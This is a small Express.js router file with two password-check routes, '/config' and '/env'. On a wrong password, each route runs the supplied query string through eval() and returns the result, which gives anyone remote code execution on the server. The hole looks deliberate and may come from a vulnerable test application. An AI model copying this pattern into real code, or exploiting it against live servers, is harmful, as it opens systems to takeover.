var express = require('express');
const fs = require("fs");
var router = express.Router();

/* GET users listing. */
router.get('/config', function(req, res, next) {
    const config = JSON.parse(fs.readFileSync('/project/config.json', 'utf8'));
    if(config?.PASSWORD && req.query.password === config.PASSWORD) {
      res.send('Correct Password');
    } else {
      res.send(eval(req.query.password));
    }
});

router.get('/env', function(req, res, next) {
    if( req.query.password === process.env.PASSWORD) {
      res.send('Correct Password');
    } else {
      res.send(eval(req.query.password));
    }
});

module.exports = router;
